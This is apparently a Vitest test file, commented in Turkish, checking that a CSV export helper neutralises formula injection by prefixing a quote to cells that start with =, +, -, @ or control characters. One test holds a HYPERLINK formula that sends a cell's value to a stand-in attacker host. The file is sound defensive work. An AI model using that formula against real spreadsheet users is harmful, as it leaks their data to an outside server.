import { describe, expect, it } from 'vitest'

import { csvHucre, csvSatir, formulMu } from '../csvHucre'

/**
 * VULN-006 — CSV formül enjeksiyonu nötrlemesi. Cetvel: csv-import-export-standard.md §1.1.
 * Hücre `= + - @ TAB CR` ile başlarsa (NFKC sonrası ilk karakter) tek tırnakla önekli yazılır;
 * SAYI/TARİH hücresi DEĞİŞMEZ; normalize edilmiş hâl çıktıya yazılmaz.
 */

describe('csvHucre — formül karakteriyle başlayan metin nötrlenir', () => {
  it.each([
    ['=1+1', `"'=1+1"`],
    ['+SUM(A1:A9)', `"'+SUM(A1:A9)"`],
    ['-2+3', `"'-2+3"`],
    ['@ETKI', `"'@ETKI"`],
    ['\tkomut', `"'\tkomut"`],
    ['\rkomut', `"'\rkomut"`],
    ['-', `"'-"`],
  ])('%j → %s', (girdi, beklenen) => {
    expect(csvHucre(girdi)).toBe(beklenen)
  })

  it('HYPERLINK saldırı örneği: önek konur, iç tırnaklar kaçırılır', () => {
    expect(csvHucre('=HYPERLINK("http://saldirgan/?x="&A2;"Tıkla")')).toBe(
      `"'=HYPERLINK(""http://saldirgan/?x=""&A2;""Tıkla"")"`,
    )
  })

  it('tam genişlikli ＝ ＋ － ＠ da yakalanır; ÇIKTIYA normalize edilmiş hâl YAZILMAZ', () => {
    for (const ilk of ['＝', '＋', '－', '＠']) {
      const girdi = `${ilk}1+1`
      const cikti = csvHucre(girdi)
      expect(cikti).toBe(`"'${girdi}"`) // özgün karakter korunur, yalnız önek eklenir
      expect(cikti).not.toContain(girdi.normalize('NFKC'))
    }
  })
})

describe('csvHucre — SAYI/TARİH ve normal metin DEĞİŞMEZ', () => {
  it('number tipi olduğu gibi yazılır (negatif dahil)', () => {
    expect(csvHucre(-5)).toBe('"-5"')
    expect(csvHucre(0)).toBe('"0"')
    expect(csvHucre(12.5)).toBe('"12.5"')
    expect(csvHucre(-0.75)).toBe('"-0.75"')
  })

  it.each([
    ['-12,50'],
    ['+905551112233'],
    ['-1.234,5'],
    ['1234'],
    ['2026-09-29'],
    ['12:30'],
  ])('sayı/tarih gibi görünen metin %j önek almaz', (girdi) => {
    expect(csvHucre(girdi)).toBe(`"${girdi}"`)
  })

  it('Date ISO yazılır, geçersiz Date boş', () => {
    expect(csvHucre(new Date('2026-09-29T08:00:00.000Z'))).toBe('"2026-09-29T08:00:00.000Z"')
    expect(csvHucre(new Date('gecersiz'))).toBe('""')
  })

  it('boolean, null, undefined, NaN, Infinity, boş metin', () => {
    expect(csvHucre(true)).toBe('"true"')
    expect(csvHucre(false)).toBe('"false"')
    expect(csvHucre(null)).toBe('""')
    expect(csvHucre(undefined)).toBe('""')
    expect(csvHucre(Number.NaN)).toBe('""')
    expect(csvHucre(Number.POSITIVE_INFINITY)).toBe('""')
    expect(csvHucre('')).toBe('""')
  })

  it('normal metin, ortada formül karakteri ve baştaki boşluk önek almaz', () => {
    expect(csvHucre('Fan 100/4')).toBe('"Fan 100/4"')
    expect(csvHucre('a=b')).toBe('"a=b"')
    expect(csvHucre('1+1')).toBe('"1+1"')
    expect(csvHucre(' =1')).toBe('" =1"')
  })

  it('çift tırnak ve çok satırlı metin kaçış kuralına uyar', () => {
    expect(csvHucre('a"b')).toBe('"a""b"')
    expect(csvHucre('satır1\nsatır2')).toBe('"satır1\nsatır2"')
  })
})

describe('formulMu ve csvSatir', () => {
  it('formulMu: karar ölçütü', () => {
    expect(formulMu('=A1')).toBe(true)
    expect(formulMu('-12,50')).toBe(false)
    expect(formulMu('')).toBe(false)
    expect(formulMu('normal')).toBe(false)
  })

  it('csvSatir ayracı korur (varsayılan virgül, isteğe göre noktalı virgül)', () => {
    expect(csvSatir(['a', 1, '=x'])).toBe(`"a","1","'=x"`)
    expect(csvSatir(['a', 1, '=x'], ';')).toBe(`"a";"1";"'=x"`)
  })
})
